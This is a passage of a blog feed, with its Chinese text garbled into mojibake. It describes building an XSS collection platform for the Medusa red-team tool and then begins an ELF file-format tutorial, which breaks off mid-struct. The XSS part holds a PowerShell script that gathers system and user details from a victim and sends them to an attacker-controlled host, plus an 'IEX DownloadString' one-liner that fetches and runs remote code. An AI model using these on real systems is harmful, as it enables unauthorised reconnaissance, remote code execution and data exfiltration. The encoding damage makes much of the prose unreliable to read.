class="line">æŸ¥è¯¢è·¨ç«™è„šæœ¬é’“é±¼é¡¹ç›®çš„è¯¦ç»†ä¿¡æ¯ï¼š&#x2F;api&#x2F;query_cross_site_script_project_info</span><br></pre></td></tr></table></figure><p>Djangoä¸­è·¯ç”±è¡¨(urls.py)æ˜¾ç¤ºå¦‚ä¸‹ï¼š</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/6.png" alt="image-20210108135851293"></p><h3 id="æ•°æ®åº“è¡¨"><a href="#æ•°æ®åº“è¡¨" class="headerlink" title="æ•°æ®åº“è¡¨"></a>æ•°æ®åº“è¡¨</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å­˜æ”¾æ¥æ”¶æ•°æ®è¡¨ï¼šCrossSiteScript</span><br><span class="line">å­˜æ”¾é¡¹ç›®ä¿¡æ¯è¡¨ï¼šCrossSiteScriptProject</span><br><span class="line">å­˜æ”¾è‡ªå®šä¹‰æ¨¡æ¿è¡¨ï¼šCrossSiteScriptTemplate</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/7.png" alt="image-20210108140227379"></p><h3 id="å‡½æ•°è®²è§£"><a href="#å‡½æ•°è®²è§£" class="headerlink" title="å‡½æ•°è®²è§£"></a>å‡½æ•°è®²è§£</h3><p>è¯¥æ¨¡å—æ‰€æœ‰å‡½æ•°é€»è¾‘ç»“æ„éƒ½ç›¸åŒï¼Œä¸ºäº†ä¸æµªè´¹å¤§å®¶çš„æ—¶é—´ï¼Œå½“å‰å°±æŒ‘é€‰ä¸€ä¸ªç”Ÿäº§é¡¹ç›®çš„å‡½æ•°å‡ºæ¥è®²è§£ï¼Œå¦‚æœæƒ³äº†è§£å„ä¸ªæ¥å£ç›¸å…³å‚æ•°å¯ä»¥æŸ¥é˜…<a href="http://medusa.ascotbe.com/Documentation/#/API/CrossSiteScript">æ–‡æ¡£</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GenerateProject</span>(<span class="params">request</span>):</span><span class="comment">#ç”¨æ¥ç”Ÿæˆé¡¹ç›®ï¼Œå¹¶ä¸”ç”Ÿæˆæ–‡ä»¶å’Œç”¨æˆ·ç»‘å®š</span></span><br><span class="line">    RequestLogRecord(request, request_api=<span class="string">&quot;create_cross_site_script_project&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            JavaScriptFileData = json.loads(request.body)[<span class="string">&quot;javascript_data&quot;</span>]<span class="comment">#è·å–å‰ç«¯ä¼ å…¥çš„åŠ å¯†è¿‡çš„jsæ–‡ä»¶æ•°æ®</span></span><br><span class="line">            ProjectName = json.loads(request.body)[<span class="string">&quot;project_name&quot;</span>]<span class="comment">#ç”¨æˆ·è‡ªå®šä¹‰çš„é¡¹ç›®å</span></span><br><span class="line">            UserToken = json.loads(request.body)[<span class="string">&quot;token&quot;</span>]</span><br><span class="line">            Uid = UserInfo().QueryUidWithToken(UserToken)  <span class="comment"># å¦‚æœç™»å½•æˆåŠŸåå°±æ¥æŸ¥è¯¢ç”¨æˆ·å</span></span><br><span class="line">            <span class="keyword">if</span> Uid != <span class="literal">None</span> <span class="keyword">and</span> JavaScriptFileData!=<span class="literal">None</span>:  <span class="comment"># æŸ¥åˆ°äº†UID,å¹¶ä¸”jsæ•°æ®ä¸ä¸ºç©º</span></span><br><span class="line">                UserOperationLogRecord(request, request_api=<span class="string">&quot;create_cross_site_script_project&quot;</span>, uid=Uid)</span><br><span class="line">                GetJavaScriptFilePath().Result()<span class="comment">#è·å–jsæ–‡ä»¶è·¯å¾„</span></span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:<span class="comment">#å¦‚æœæŸ¥è¯¢ç¡®å®å†²çªäº†</span></span><br><span class="line">                    JavaScriptSaveFileName=randoms().result(<span class="number">5</span>)<span class="comment">#æ–‡ä»¶å</span></span><br><span class="line">                    QueryJavaScriptSaveFileNameValidity = CrossSiteScriptProject().RepeatInvestigation(file_name=JavaScriptSaveFileName)<span class="comment">#åˆ¤æ–­æ–‡ä»¶æ˜¯å¦é‡å¤</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> QueryJavaScriptSaveFileNameValidity:<span class="comment">#å¦‚æœä¸å†²çªçš„è¯è·³å‡ºå¾ªç¯</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                JavaScriptSaveRoute = GetJavaScriptFilePath().Result() + JavaScriptSaveFileName  <span class="comment"># è·å¾—ä¿å­˜è·¯å¾„</span></span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(JavaScriptSaveRoute, <span class="string">&#x27;w+&#x27;</span>,encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(base64.b64decode(<span class="built_in">str</span>(JavaScriptFileData).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>))<span class="comment">#æ–‡ä»¶å†…å®¹è¿˜è¦åŠ å¯†</span></span><br><span class="line">                CrossSiteScriptProject().Write(file_name=JavaScriptSaveFileName,uid=Uid,project_name=ProjectName)<span class="comment">#å†™åˆ°æ•°æ®åº“è¡¨ä¸­</span></span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: JavaScriptSaveFileName, <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)<span class="comment">#è¿”å›åˆ›å»ºå¥½çš„æ–‡ä»¶å</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&quot;å°å®è´è¿™æ˜¯éæ³•æŸ¥è¯¢å“¦(à¹‘â€¢Ì€ã…‚â€¢Ì)Ùˆâœ§&quot;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">403</span>, &#125;)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            ErrorLog().Write(<span class="string">&quot;Web_CrossSiteScriptHub_CrossSiteScript_GenerateProject(def)&quot;</span>, e)</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;å‘å‘å‘ï¼èé…±è¢«ç©åå•¦(&gt;^Ï‰^&lt;)&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">169</span>, &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;è¯·ä½¿ç”¨Postè¯·æ±‚&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">500</span>, &#125;)</span><br></pre></td></tr></table></figure><ul><li><code>RequestLogRecord</code>å’Œ<code>UserOperationLogRecord</code>å‡½æ•°æ˜¯ç”¨æˆ·è¡Œä¸ºåˆ¤æ–­ä½¿ç”¨çš„çš„</li><li><code>UserInfo().QueryUidWithToken(UserToken)</code>æ˜¯å¯¹ç”¨æˆ·ä¼ å…¥çš„tokenè¿›è¡Œæƒé™éªŒè¯çš„</li><li><code>ErrorLog().Write()</code>æ˜¯å¯¹æŠ¥é”™æ—¥å¿—è¿›è¡Œä¸€ä¸ªå†™å…¥æ“ä½œçš„ï¼Œè¿™å‡ ä¸ªå‡½æ•°éƒ½ä¸ç”¨å»ç®¡å®ƒï¼Œè¿™ä¸åœ¨æˆ‘ä»¬çš„ä»‹ç»ä¸­</li></ul><p>1.é¦–å…ˆå‡½æ•°é€šè¿‡åˆ¤æ–­ç”¨æˆ·çš„è¯·æ±‚æ–¹å¼</p><p>2.å½“ç”¨æˆ·ä½¿ç”¨POSTçš„æ—¶å€™ï¼Œè¿›è¡Œç”¨æˆ·ä¼ å…¥<code>project_name</code>ã€<code>javascript_data</code>ã€<code>token</code>ä¸‰ä¸ªå€¼çš„è·å–</p><p>3.é€šè¿‡è·å–åˆ°çš„<code>token</code>å€¼è¿›è¡ŒæŸ¥è¯¢ç”¨æˆ·çš„UIDå€¼</p><p>4.å¦‚æœUIDä¸ä¸ºç©ºä¸”ä¼ å…¥çš„<code>javascript_data</code>å€¼ä¸ä¸ºç©ºï¼Œè¿›è¡Œæ–‡ä»¶åç”Ÿæˆ</p><p>5.å½“æ–‡ä»¶åä¸å†²çªçš„æ—¶å€™è¿›è¡Œæ‹¼æ¥å†™å…¥åˆ°æœ¬åœ°ï¼Œå¹¶ä¸”ä¼ å…¥åˆ°æ•°æ®åº“ä¸­</p><h2 id="æ•ˆæœæ¼”ç¤º"><a href="#æ•ˆæœæ¼”ç¤º" class="headerlink" title="æ•ˆæœæ¼”ç¤º"></a>æ•ˆæœæ¼”ç¤º</h2><h3 id="è®¾ç½®é¶æœº"><a href="#è®¾ç½®é¶æœº" class="headerlink" title="è®¾ç½®é¶æœº"></a>è®¾ç½®é¶æœº</h3><p>ç”¨PHPstudyå¿«é€Ÿæ­å»ºä¸€ä¸ªå—å®³è€…æœºå™¨ï¼Œåˆ©ç”¨phpæ¥ç”Ÿæˆä¸€ä¸ªcookie</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;åˆ†äº«demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Hello world&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;hacker by ascotbe&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/8.png" alt="image-20210108144136426"></p><h3 id="åˆ›å»ºé¡¹ç›®"><a href="#åˆ›å»ºé¡¹ç›®" class="headerlink" title="åˆ›å»ºé¡¹ç›®"></a>åˆ›å»ºé¡¹ç›®</h3><p>åˆ›å»ºå¥½éœ€è¦æ›¿æ¢æ‰æ–‡æœ¬ä¸­çš„ipå’Œé¡¹ç›®æ–‡ä»¶åœ°å€è¿™ä¸¤ä¸ªå‚æ•°</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/9.gif" alt="2"></p><h3 id="æ„å»ºPOC"><a href="#æ„å»ºPOC" class="headerlink" title="æ„å»ºPOC"></a>æ„å»ºPOC</h3><p>æ¥ç€æˆ‘ä»¬åœ¨é¶æœºä¸Šé¢æ·»åŠ XSSå†…å®¹ï¼ŒIPå¡«ä½ çš„åŸŸåæˆ–è€…ä½ åç«¯çš„åœ°å€</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/10.png" alt="image-20210108160245965"></p><h3 id="æŸ¥çœ‹æ•ˆæœ"><a href="#æŸ¥çœ‹æ•ˆæœ" class="headerlink" title="æŸ¥çœ‹æ•ˆæœ"></a>æŸ¥çœ‹æ•ˆæœ</h3><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/11.gif" alt="3"></p><p>å¯ä»¥çœ‹åˆ°ä¸Šå›¾<strong>1.php</strong>æ–‡ä»¶ç”Ÿæˆäº†ä¸€ä¸ªcookieï¼Œç„¶ååŠ è½½äº†äº‘ç«¯çš„jsè„šæœ¬ï¼Œæœ€ååƒäº‘ç«¯å‘é€äº†æ•°æ®</p><h2 id="å…¶ä»–ç”¨æ³•"><a href="#å…¶ä»–ç”¨æ³•" class="headerlink" title="å…¶ä»–ç”¨æ³•"></a>å…¶ä»–ç”¨æ³•</h2><p>å…¶å®å¾ˆå¤šæ—¶å€™å½“ç›®æ ‡æœºå™¨å¯ä»¥æ— å›æ˜¾æ‰§è¡Œå‘½ä»¤æ—¶ä½¿ç”¨ï¼Œæˆ‘ä»¬ç”¨çš„dnslogæ¥è·å–æ•°æ®ä¼šå¾ˆæ…¢ï¼Œè¿˜å¯ä»¥é€šè¿‡powershellè·å–æ•°æ®</p><h3 id="åˆ›å»ºé¡¹ç›®-1"><a href="#åˆ›å»ºé¡¹ç›®-1" class="headerlink" title="åˆ›å»ºé¡¹ç›®"></a>åˆ›å»ºé¡¹ç›®</h3><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/12.png" alt="image-20210108170533024"></p><p>è¿™è¾¹æŠŠjsæ–‡ä»¶å†…å®¹æ›¿æ¢æˆpowershellå‘½ä»¤ï¼Œç„¶ååˆ›å»ºé¡¹ç›®</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Desktop</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_Desktop</span><br><span class="line"><span class="variable">$BIOS</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_BIOS</span><br><span class="line"><span class="variable">$Processor</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_Processor | <span class="built_in">Select-Object</span> <span class="literal">-ExcludeProperty</span> <span class="string">&quot;CIM*&quot;</span></span><br><span class="line"><span class="variable">$QuickFixEngineering</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_QuickFixEngineering</span><br><span class="line"><span class="variable">$OperatingSystem</span> =<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_OperatingSystem | <span class="built_in">Select-Object</span> <span class="literal">-Property</span> Build*,OSType,ServicePack*</span><br><span class="line"><span class="variable">$LogicalDisk</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_LogicalDisk <span class="literal">-Filter</span> <span class="string">&quot;DriveType=3&quot;</span></span><br><span class="line"><span class="variable">$ComputerSystem</span>=<span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> Win32_ComputerSystem <span class="literal">-Property</span> UserName</span><br><span class="line"><span class="variable">$R</span> = <span class="built_in">Invoke-WebRequest</span> <span class="literal">-URI</span> http://ip/a/é¡¹ç›®æ–‡ä»¶å/?Desktop=<span class="variable">$Desktop</span><span class="string">&quot;&amp;&quot;</span>BIOS=<span class="variable">$BIOS</span><span class="string">&quot;&amp;&quot;</span>Processor=<span class="variable">$Processor</span><span class="string">&quot;&amp;&quot;</span>ComputerSystem=<span class="variable">$ComputerSystem</span><span class="string">&quot;&amp;&quot;</span><span class="variable">$QuickFixEngineering</span>=QuickFixEngineering<span class="string">&quot;&amp;&quot;</span>OperatingSystem=<span class="variable">$OperatingSystem</span><span class="string">&quot;&amp;&quot;</span>LogicalDisk=<span class="variable">$LogicalDisk</span> </span><br></pre></td></tr></table></figure><h3 id="è¿è¡Œæ¼”ç¤º"><a href="#è¿è¡Œæ¼”ç¤º" class="headerlink" title="è¿è¡Œæ¼”ç¤º"></a>è¿è¡Œæ¼”ç¤º</h3><p>æ‰§è¡Œå‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object Net.WebClient).DownloadString(&quot;http:&#x2F;&#x2F;10.91.212.184:9999&#x2F;s&#x2F;eeUZF&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CrossSiteScripting/13.gif" alt="4"></p><h2 id="æ€»ç»“æ€è€ƒ"><a href="#æ€»ç»“æ€è€ƒ" class="headerlink" title="æ€»ç»“æ€è€ƒ"></a>æ€»ç»“æ€è€ƒ</h2><p>å¤§éƒ¨åˆ†ç™½å¸½å­æµ‹è¯•æ¼æ´å°±æ˜¯è¿›è¡Œä¸€ä¸ªæ™®é€šå¼¹çª—æ¼”ç¤ºï¼Œä½†æ˜¯æ­£å¸¸æ‰“çº¢é˜Ÿï¼Œæƒ³è¦è·å–ç›®æ ‡å®¢æœçš„ä¸€äº›ä¿¡æ¯çš„æ—¶å€™ï¼Œç”±äºä¿¡ä»»ä»¥åŠç½‘å€è¢«WAFæ‹¦æˆªç­‰æƒ…å†µï¼Œå¯¼è‡´å„ç§é—®é¢˜ï¼Œå¹¶ä¸”æ— å¼€æºé¡¹ç›®</p><p>æœ¬æ–‡ä»‹ç»äº†ä¸€ä¸ªXSSå¹³å°ä»å¤´åˆ°å°¾çš„è¯ç”Ÿï¼Œä»¥åŠåˆ©ç”¨åŸç†ï¼Œè™½ç„¶ä»£ç æ²¡æœ‰å…·ä½“è¯¦ç»†è®²è§£ï¼Œä¸»è¦æ˜¯å¤ªè¿‡äºæ¯ç‡¥ï¼Œæ„Ÿå…´è¶£çš„å¸ˆå‚…ç›´æ¥çœ‹é¡¹ç›®æºç å°±èƒ½å¤Ÿçœ‹æ‡‚ï¼Œå‡ ä¹æ˜¯æ¯ä¸€è¡Œéƒ½æœ‰æ³¨é‡Šï¼Œé¡¹ç›®æ•´ä½“ä¸€ä¸ªå¤§çš„æ¨¡å—å†™ä¸‹æ¥èŠ±äº†å°åŠä¸ªæœˆæ—¶é—´ï¼Œè™½ç„¶åŠŸèƒ½ä¸å¤šï¼Œä½†æ˜¯å½“æ—¶æƒ³å†™ä¸€ä¸ªè¿™ä¸ªæ¨¡å—çš„æ—¶å€™ï¼Œæ— ä»ä¸‹æ‰‹åªèƒ½å»çœ‹ç½‘ä¸Šåˆ«äººæ­å»ºçš„å¹³å°ï¼Œé€šè¿‡æ³¨å†ŒæŠ“åŒ…çœ‹é€»è¾‘ç»“æ„ï¼Œè¿›è¡Œç†è§£ã€‚æ¯æ¬¡åŠ¨æ‰‹å†™ä¸œè¥¿çš„æ—¶å€™éƒ½èƒ½æ”¶è·è®¸å¤šä¸œè¥¿ï¼Œå¤šå­¦å¤šè°¢æ‰èƒ½ä»å¼€å‘çš„è§’åº¦å»æ‰¾æ¼æ´ã€‚</p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux ELFæ ¼å¼è§£æ</title>
    <link href="https://www.ascotbe.com/2020/12/06/ExecutableLinkableFormat/"/>
    <id>https://www.ascotbe.com/2020/12/06/ExecutableLinkableFormat/</id>
    <published>2020-12-06T15:45:42.000Z</published>
    <updated>2021-07-05T01:53:25.063Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å£°æ˜</p></blockquote><p>éƒ‘é‡å£°æ˜ï¼šæ–‡ä¸­æ‰€æ¶‰åŠçš„æŠ€æœ¯ã€æ€è·¯å’Œå·¥å…·ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ä»¥åŠç›ˆåˆ©ç­‰ç›®çš„ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</p><blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2></blockquote><p>åœ¨å†™PEç»“æ„è§£æçš„æ—¶å€™ï¼Œä»¥ä¸ºELFç»“æ„æ²¡å¿…è¦å»çœ‹æ–‡ä»¶ç»“æ„ï¼Œç›´åˆ°åé¢åšäº†PWNé¢˜å‘ç°ä¸æ˜¯è¿™æ ·çš„ï¼Œæ‰€æœ‰è¿˜æ˜¯å­¦ä¹ ä¸‹ELFç»“æ„ï¼Œç„¶åå†å†™ä¸ªè§£æå™¨</p><blockquote><h2 id="å¸¸è§ç»“æ„åŒºåˆ†"><a href="#å¸¸è§ç»“æ„åŒºåˆ†" class="headerlink" title="å¸¸è§ç»“æ„åŒºåˆ†"></a>å¸¸è§ç»“æ„åŒºåˆ†</h2></blockquote><p>ç›®å‰ï¼ŒPCå¹³å°æµè¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ï¼ˆExecutableï¼‰ä¸»è¦åŒ…å«å¦‚ä¸‹ä¸¤ç§ï¼Œå®ƒä»¬éƒ½æ˜¯<strong>COFF</strong>ï¼ˆCommon File Formatï¼‰æ ¼å¼çš„å˜ç§</p><ul><li>Windowsä¸‹çš„<strong>PE</strong>ï¼ˆPortable Executableï¼‰</li><li>Linuxä¸‹çš„<strong>ELF</strong>ï¼ˆExecutable Linkable Formatï¼‰</li></ul><p><strong>æºä»£ç ç»è¿‡ç¼–è¯‘åä½†æœªè¿›è¡Œè¿æ¥çš„é‚£äº›ä¸­é—´æ–‡ä»¶</strong>ï¼ˆWindowsçš„<code>.obj</code>å’ŒLinuxçš„<code>.o</code>ï¼‰ï¼Œå®ƒä¸å¯æ‰§è¡Œæ–‡ä»¶çš„æ ¼å¼éå¸¸ç›¸ä¼¼ï¼Œæ‰€ä»¥ä¸€èˆ¬è·Ÿå¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ä¸€èµ·é‡‡ç”¨åŒä¸€ç§æ ¼å¼å­˜å‚¨ã€‚</p><p>å…¶ä¸­åŠ¨æ€é“¾æ¥åº“ï¼ˆ<strong>DDLï¼ŒDynamic Linking Library</strong>ï¼‰å’Œé™æ€é“¾æ¥åº“ï¼ˆ<strong>Static Linking Library</strong>ï¼‰çš„æ ¼å¼éƒ½å’Œå½“å‰ç³»ç»Ÿå¯¹åº”çš„å¯æ‰§è¡Œæ–‡ä»¶ç»“æ„ä¸€æ ·</p><ul><li>åŠ¨æ€é“¾æ¥åº“ï¼šWindowsçš„<code>.dll</code>ã€Linuxçš„<code>.so</code></li><li>é™æ€é“¾æ¥åº“ï¼šWindowsçš„<code>.lib</code>ã€Linuxçš„<code>.a</code></li></ul><blockquote><h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2></blockquote><h3 id="æ–‡ä»¶æ ¼å¼"><a href="#æ–‡ä»¶æ ¼å¼" class="headerlink" title="æ–‡ä»¶æ ¼å¼"></a>æ–‡ä»¶æ ¼å¼</h3><p>ELFæ–‡ä»¶æœ‰ä¸‰ç§ç±»å‹ï¼Œå¯ä»¥é€šè¿‡ELF Headerä¸­çš„<code>e_type</code>æˆå‘˜è¿›è¡ŒåŒºåˆ†ï¼š</p><ul><li><strong>å¯é‡å®šä½æ–‡ä»¶ï¼ˆRelocatable Fileï¼‰</strong>ï¼š<code>ETL_REL</code>ã€‚ä¸€èˆ¬ä¸º<code>.o</code>æ–‡ä»¶ï¼Œå¯ä»¥ä¸å…¶ä»–ç›®æ ‡æ–‡ä»¶é“¾æ¥æ¥åˆ›å»ºå¯æ‰§è¡Œæ–‡ä»¶æˆ–å…±äº«ç›®æ ‡æ–‡ä»¶çš„ä»£ç å’Œæ•°æ®ã€‚é™æ€é“¾æ¥åº“å±äºå¯é‡å®šä½æ–‡ä»¶</li><li><strong>å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆExecutable Fileï¼‰</strong>ï¼š<code>ET_EXEC</code>ã€‚å¯ä»¥æ‰§è¡Œçš„ä¸€ä¸ªç¨‹åºï¼Œæ­¤æ–‡ä»¶è§„å®šäº†exec()å¦‚ä½•åˆ›å»ºä¸€ä¸ªç¨‹åºçš„è¿›ç¨‹æ˜ åƒã€‚</li><li>å…±äº«ç›®æ ‡æ–‡ä»¶ï¼ˆShared Object Fileï¼‰ï¼š<code>ET_DYN</code>ã€‚ä¸€èˆ¬ä¸º<code>.so</code>æ–‡ä»¶ã€‚<ul><li>é“¾æ¥å™¨å°†å…¶ä¸å…¶ä»–å¯é‡å®šä½æ–‡ä»¶ã€å…±äº«ç›®æ ‡æ–‡ä»¶é“¾æ¥æˆæ–°çš„ç›®æ ‡æ–‡ä»¶ï¼›</li><li>åŠ¨æ€é“¾æ¥å™¨ï¼ˆDynamic Linkerï¼‰å°†å…¶ä¸æŸä¸ªå¯æ‰§è¡Œæ–‡ä»¶æˆ–å…¶ä»–å…±äº«ç›®æ ‡æ–‡ä»¶ç»“åˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œåˆ›å»ºè¿›ç¨‹æ˜ åƒã€‚</li></ul></li></ul><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/ELF/1.png" alt="img"></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œä¸ºELFæ–‡ä»¶çš„åŸºæœ¬ç»“æ„ï¼Œä¸»è¦ç”±å››éƒ¨åˆ†ç»„æˆï¼š</p><ul><li>ELF Header</li><li>ELF Program Header Tableï¼ˆæˆ–ç§°Program Headersã€ç¨‹åºå¤´ï¼‰</li><li>ELF Section Header Tableï¼ˆæˆ–ç§°Section Headersã€èŠ‚å¤´è¡¨ï¼‰</li><li>ELF Section</li></ul><p>ä»å›¾ä¸­ï¼Œå°±èƒ½çœ‹å‡ºå®ƒä»¬å„è‡ªçš„æ•°æ®ç»“æ„ä»¥åŠç›¸äº’ä¹‹é—´çš„ç´¢å¼•å…³ç³»ã€‚ä¸‹é¢ä¾æ¬¡ä»‹ç»ã€‚</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/ELF/2.png" alt="png"></p><p>æ®µï¼ˆ<code>Segment</code>ï¼‰ä¸èŠ‚ï¼ˆ<code>Section</code>ï¼‰çš„åŒºåˆ«åœ¨äºï¼Œæ®µæ˜¯ç¨‹åºæ‰§è¡Œçš„å¿…è¦ç»„æˆï¼Œå½“å¤šä¸ªç›®æ ‡æ–‡ä»¶é“¾æ¥æˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œä¼šå°†ç›¸åŒæƒé™çš„èŠ‚åˆå¹¶åˆ°ä¸€ä¸ªæ®µä¸­ã€‚ç›¸æ¯”è€Œè¨€ï¼ŒèŠ‚çš„ç²’åº¦æ›´å°ã€‚</p><hr><h3 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h3><p>æ–‡ä»¶çš„æœ€å¼€å§‹å‡ ä¸ªå­—èŠ‚ç»™å‡ºå¦‚ä½•è§£é‡Šæ–‡ä»¶çš„æç¤ºä¿¡æ¯ã€‚ è¿™äº›ä¿¡æ¯ç‹¬ç«‹äºå¤„ç†å™¨ï¼Œ ä¹Ÿç‹¬ç«‹äºæ–‡ä»¶ä¸­çš„å…¶ä½™å†…å®¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_NIDENT 16</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[EI_NIDENT]; <span class="comment">//magic number</span></span><br><span class="line">Elf32_Half e_type;                <span class="comment">//Ojbect file type</span></span><br><span class="line">Elf32_Half e_machine;             <span class="comment">//Architecture</span></span><br><span class="line">Elf32_Word e_version;             <span class="comment">//Object file version </span></span><br><span class="line">Elf32_Addr e_entry;               <span class="comment">//entry point</span></span><br><span class="line">Elf32_Off  e_phoff;               <span class="comment">//ç¨‹åºå¤´å†…å®¹åœ¨æ–‡ä»¶çš„åç§»é‡</span></span><br><span class="line">Elf32_off  e_shoff;               <span class="comment">//æ®µå¤´å†…å®¹åœ¨æ–‡ä»¶çš„åç§»é‡</span></span><br><span class="line">Elf32_Word e_flags;</span><br><span class="line">Elf32_Half e_ehsize;              <span class="comment">//elfå¤´éƒ¨å¤§å°</span></span><br><span class="line">Elf32_Half e_phentsize;           <span class="comment">//ç¨‹åºå¤´éƒ¨è¡¨æ ¼çš„è¡¨é¡¹å¤§å°</span></span><br><span class="line">Elf32_Half e_phnum;               <span 